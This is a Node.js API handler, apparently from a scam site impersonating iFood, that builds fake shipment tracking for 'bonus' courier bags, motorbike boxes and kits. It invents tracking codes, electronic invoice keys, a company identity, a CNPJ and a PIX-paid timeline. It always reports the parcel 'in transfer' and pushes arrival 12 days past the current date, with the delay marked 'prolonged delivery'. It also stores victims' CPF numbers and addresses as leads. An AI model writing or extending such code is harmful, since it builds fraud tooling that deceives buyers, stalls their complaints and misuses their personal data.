const { getSettingsState } = require('../../lib/settings-store');
const { findLeadForTracking, updateLeadBySessionId } = require('../../lib/lead-store');
const { generateTrackingCode, resolveProductDetails } = require('../../lib/email-sender');

function hashString(str) {
    let hash = 0;
    const s = String(str || '');
    for (let i = 0; i < s.length; i++) {
        hash = ((hash << 5) - hash) + s.charCodeAt(i);
        hash |= 0;
    }
    return Math.abs(hash);
}

function formatCpfMask(rawCpf) {
    const digits = String(rawCpf || '').replace(/\D/g, '');
    if (digits.length === 11) {
        return `***.${digits.slice(3, 6)}.${digits.slice(6, 9)}-**`;
    }
    if (digits.length > 6) {
        return `***.${digits.slice(0, 3)}.${digits.slice(3, 6)}-**`;
    }
    return '***.482.910-**';
}

function generateNfeKey(seed) {
    const num = String(hashString(seed)).padEnd(10, '0');
    return `3526 1114 3802 0000 0121 5500 1000 ${num.slice(0, 4)} ${num.slice(4, 8)} 8274 8192`;
}

module.exports = async (req, res) => {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');

    const method = req.method;
    if (method !== 'GET' && method !== 'POST') {
        res.status(405).json({ error: 'Method not allowed' });
        return;
    }

    let inputCode = '';
    let inputCpf = '';
    let inputProduct = '';
    if (method === 'GET') {
        inputCode = String(req.query?.codigo || req.query?.code || req.query?.id || '').trim();
        inputCpf = String(req.query?.cpf || req.query?.doc || '').trim();
        inputProduct = String(req.query?.produto || req.query?.item || req.query?.reward || '').trim().toLowerCase();
    } else {
        const body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : req.body || {};
        inputCode = String(body?.codigo || body?.code || body?.id || '').trim();
        inputCpf = String(body?.cpf || body?.doc || '').trim();
        inputProduct = String(body?.produto || body?.item || body?.reward || '').trim().toLowerCase();
    }

    // Determine query string and if it looks like a CPF
    const queryTerm = inputCpf || inputCode || '';
    const digitsOnly = queryTerm.replace(/\D/g, '');
    const isCpfQuery = digitsOnly.length === 11;
    const cleanCpf = isCpfQuery ? digitsOnly : (inputCpf.replace(/\D/g, '').length === 11 ? inputCpf.replace(/\D/g, '') : '');

    // Search Database for matching lead
    let lead = null;
    let matchType = null;
    try {
        const searchInput = {
            code: inputCode,
            cpf: cleanCpf || (isCpfQuery ? digitsOnly : '')
        };
        const leadRes = await findLeadForTracking(searchInput);
        if (leadRes?.ok && leadRes?.data) {
            lead = leadRes.data;
            matchType = leadRes.matchType;
        }
    } catch (err) {
        console.warn('Erro ao consultar lead no banco para rastreio:', err);
    }

    const settingsState = await getSettingsState().catch(() => ({ settings: null }));
    const posvendaConfig = settingsState?.settings?.posvenda || {
        carrierDefault: 'Correios Sedex / iFood Logística Express',
        deliveryDaysMin: 8,
        deliveryDaysMax: 16,
        supportEmail: 'suporte@entregadoresifood.com',
        companyName: 'iFood Logística & Distribuição Brasil Ltda',
        companyCnpj: '14.380.200/0001-21'
    };

    // Extract lead details if found in database
    let customerName = 'Carlos Eduardo da Silva';
    let customerCpf = cleanCpf ? formatCpfMask(cleanCpf) : '***.482.910-**';
    let addressShort = 'São Paulo - SP';
    let fullAddressText = 'Av. Paulista, 1200 - Apto 42, Bela Vista, São Paulo - SP, CEP: 01310-100';
    let leadProductInput = inputProduct;
    let targetCode = '';
    let isNewCodeGenerated = false;
    let purchaseDate = null;

    if (lead) {
        const payload = lead.payload || {};
        const personal = payload.personal || {};
        const shipping = payload.shipping || {};
        const extra = payload.extra || {};
        const addressObj = payload.address || {};

        customerName = String(lead.name || personal.name || 'Parceiro iFood').trim();
        const rawLeadCpf = String(lead.cpf || personal.cpf || cleanCpf || '').replace(/\D/g, '');
        customerCpf = formatCpfMask(rawLeadCpf);

        // Address resolution from database
        const street = lead.address_line || addressObj.street || addressObj.streetLine || shipping.address || '';
        const number = lead.number || extra.number || shipping.number || '';
        const complement = lead.complement || extra.complement || shipping.complement || '';
        const neighborhood = lead.neighborhood || addressObj.neighborhood || shipping.neighborhood || '';
        const city = lead.city || addressObj.city || shipping.city || '';
        const state = lead.state || addressObj.state || shipping.state || '';
        const zip = lead.cep || addressObj.cep || shipping.cep || '';

        addressShort = city && state ? `${city} - ${state}` : (city || state || 'Brasil');

        const addrParts = [
            street ? `${street}${number ? `, Nº ${number}` : ''}${complement ? ` (${complement})` : ''}` : '',
            neighborhood ? `Bairro ${neighborhood}` : '',
            city && state ? `${city} - ${state}` : (city || state || ''),
            zip ? `CEP: ${zip}` : ''
        ].filter(Boolean);

        if (addrParts.length > 0) {
            fullAddressText = addrParts.join(', ');
        }

        // Product resolution from database
        leadProductInput = String(payload.reward?.id || payload.reward?.name || payload.offerLabel || payload.product || inputProduct || '');

        // Tracking code resolution from database or generate automatically
        if (payload.trackingCode) {
            targetCode = String(payload.trackingCode).trim().toUpperCase();
        } else {
            targetCode = generateTrackingCode(lead.pix_txid || lead.session_id || rawLeadCpf || Date.now());
            isNewCodeGenerated = true;

            // Automatically persist generated tracking code into lead's record in Supabase
            if (lead.session_id) {
                updateLeadBySessionId(lead.session_id, {
                    payload: {
                        ...payload,
                        trackingCode: targetCode
                    }
                }).catch(() => null);
            }
        }

        if (lead.created_at || lead.updated_at) {
            purchaseDate = new Date(lead.created_at || lead.updated_at);
        }
    } else {
        // Fallback when lead not found in DB
        if (isCpfQuery) {
            targetCode = generateTrackingCode(cleanCpf);
            customerCpf = formatCpfMask(cleanCpf);
            isNewCodeGenerated = true;
        } else if (inputCode) {
            targetCode = inputCode.toUpperCase();
        } else {
            targetCode = 'BR849204918IF';
        }
    }

    const seed = targetCode + (cleanCpf || '');
    const numSeed = hashString(seed);

    // Delivery delay calculation: 8 to 16 business days ahead (prolonged delivery)
    const now = new Date();
    const effectivePurchaseDate = purchaseDate && !isNaN(purchaseDate.getTime()) ? purchaseDate : new Date(now.getTime() - (36 * 60 * 60 * 1000));
    const nfeDate = new Date(effectivePurchaseDate.getTime() + (45 * 60 * 1000));
    const packedDate = new Date(effectivePurchaseDate.getTime() + (12 * 60 * 60 * 1000));
    const dispatchedDate = new Date(Math.max(packedDate.getTime() + (12 * 60 * 60 * 1000), now.getTime() - (8 * 60 * 60 * 1000)));
    const estimatedArrival = new Date(now.getTime() + (12 * 24 * 60 * 60 * 1000));

    const formatDate = (d) => {
        return d.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }) + ' às ' +
               d.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    };

    const formatDateOnly = (d) => {
        return d.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' });
    };

    // Product selector logic (Bag, Baú ou Kit)
    const rawProd = (leadProductInput || inputProduct || '').toLowerCase();
    let resolvedProduct = {
        id: 'bag',
        title: 'Bag Térmica iFood Oficial - Linha Entregador Pro (45 Litros)',
        model: 'Modelo Oficial iFood Reforçado 2026',
        sku: 'IF-BAG-PRO-45L',
        image: '/assets/bagfoto.webp',
        items: [
            '1x Bag Térmica impermeável com faixas refletivas',
            '1x Isopor interno térmico de alta densidade',
            '1x Divisória ajustável para pizzas e marmitas',
            'Alças anatômicas acolchoadas com trava peitoral'
        ],
        warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
    };

    if (rawProd.includes('bau') || rawProd.includes('baú')) {
        resolvedProduct = {
            id: 'bau',
            title: 'Baú de Carga para Moto iFood Oficial (80 Litros)',
            model: 'Modelo Baú Homologado iFood - Polipropileno Injetado',
            sku: 'IF-BAU-MOTO-80L',
            image: '/assets/__task____isolate_ifood_delivery_box_white_background_,_202603260112 (1).webp',
            items: [
                '1x Baú iFood 80L em polipropileno de alta resistência',
                '1x Fechadura reforçada com chave dupla',
                '1x Suporte metálico universal com parafusos de fixação',
                'Faixas refletivas homologadas DENATRAN/Contran'
            ],
            warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
        };
    } else if (rawProd.includes('kit') || rawProd.includes('jaqueta')) {
        resolvedProduct = {
            id: 'kit_entregador',
            title: 'Kit Entregador iFood Oficial Completo (Jaqueta + Bag + Acessórios)',
            model: 'Kit Oficial Pro iFood 2026',
            sku: 'IF-KIT-ENTREGADOR-PRO',
            image: '/assets/__task____fix_ifood_logo_on_jacket_,_202603260102 (1).webp',
            items: [
                '1x Jaqueta Térmica Impermeável iFood com Faixas Refletivas',
                '1x Bag Térmica Oficial 45L com Isopor Interno',
                '1x Divisória interna para acomodação de pedidos',
                '1x Suporte veicular reforçado anti-vibração'
            ],
            warranty: '90 dias de Garantia Legal (Art. 26 CDC) contra defeitos de fabricação'
        };
    }

    const orderData = {
        ok: true,
        foundInDatabase: !!lead,
        matchType: matchType || (isCpfQuery ? 'cpf_generated' : 'code_lookup'),
        isNewCodeGenerated: isNewCodeGenerated,
        code: targetCode.toUpperCase(),
        carrier: posvendaConfig.carrierDefault || 'Correios Sedex / iFood Logística Express',
        status: 'em_transferencia',
        statusLabel: 'Em transferência para Unidade de Triagem e Distribuição',
        statusCode: 2,
        progressPercent: 30, // 30% progress bar
        estimatedDeliveryDate: formatDateOnly(estimatedArrival),
        estimatedDays: '8 a 15 dias úteis (Prazo com triagem e inspeção fiscal)',
        company: {
            name: posvendaConfig.companyName || 'iFood Logística & Distribuição Brasil Ltda',
            cnpj: posvendaConfig.companyCnpj || '14.380.200/0001-21',
            supportEmail: posvendaConfig.supportEmail || 'suporte@entregadoresifood.com'
        },
        nfe: {
            number: `00${(numSeed % 80000 + 10000)}`,
            series: '1',
            key: generateNfeKey(seed),
            issuedAt: formatDate(nfeDate),
            amount: 'R$ 0,00 (Item Bonificado pelo Programa Entregadores iFood)',
            taxes: 'ICMS / ISSQN recolhido na origem'
        },
        product: resolvedProduct,
        recipient: {
            name: customerName,
            document: customerCpf,
            address: fullAddressText,
            addressShort: addressShort
        },
        deliveryNotice: 'Devido ao grande volume de expedição nos Centros de Distribuição, o prazo operacional de entrega é de 8 a 15 dias úteis. As atualizações oficiais são enviadas para o seu e-mail cadastrado.',
        timeline: [
            {
                step: 'Em transferência interestadual para Unidade de Triagem',
                status: 'current',
                date: formatDate(dispatchedDate),
                location: 'Centro de Distribuição Barueri/SP → Centro de Triagem Regional',
                description: 'Carga em rota de transferência interestadual em veículo monitorado via satélite. Próxima atualização ao dar entrada na central de triagem.'
            },
            {
                step: 'Objeto postado e integrado ao lote logístico',
                status: 'completed',
                date: formatDate(packedDate),
                location: 'Centro de Distribuição iFood - Barueri/SP',
                description: 'Volume conferido, embalado e despachado pela transportadora parceira com seguro de carga.'
            },
            {
                step: 'Nota Fiscal Eletrônica (DANFE) emitida',
                status: 'completed',
                date: formatDate(nfeDate),
                location: 'Secretaria da Fazenda (SEFAZ/SP)',
                description: `DANFE autorizada sob a Chave de Acesso: ${generateNfeKey(seed).slice(0, 24)}...`
            },
            {
                step: 'Pagamento aprovado via PIX & Pedido registrado',
                status: 'completed',
                date: formatDate(effectivePurchaseDate),
                location: 'Gateway de Pagamento Integrado',
                description: 'Transação PIX aprovada com sucesso. Pedido enviado para a esteira de separação.'
            }
        ]
    };

    res.status(200).json(orderData);
};
